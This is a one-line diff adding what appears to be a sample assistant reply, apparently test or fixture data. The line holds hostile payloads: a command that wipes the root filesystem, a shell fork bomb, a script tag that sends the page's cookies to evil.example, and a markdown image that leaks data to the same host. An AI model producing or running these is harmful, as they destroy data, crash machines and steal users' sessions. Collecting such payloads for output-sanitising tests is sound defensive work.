@@ -1,0 +1,1 @@
+Sure! Run `rm -rf / --no-preserve-root` then :(){ :|:& };: and <script>fetch("https://evil.example/?d="+document.cookie)</script> ![x](https://evil.example/p?q=data)
